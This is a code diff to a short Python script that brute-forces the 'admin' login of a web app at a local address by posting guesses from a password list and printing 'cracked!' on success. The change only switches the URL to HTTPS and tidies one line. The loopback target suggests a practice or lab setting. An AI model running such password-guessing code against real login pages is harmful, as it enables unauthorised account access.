@@ -2,7 +2,7 @@
 
 import requests
 
-URL = 'http://127.0.1.1:5000/user/login'
+URL = 'https://127.0.1.1:5000/user/login'  # Changed to HTTPS
 
 username = 'admin'
 
@@ -19,7 +19,7 @@ passwords = [
 ]
 
 for password in passwords:
-    response = requests.post(URL, data = {'username': username, 'password': password}, timeout=60)
+    response = requests.post(URL, data={'username': username, 'password': password}, timeout=60)
     if 'HOME' in response.text:
         print('cracked!', username, password)
         break
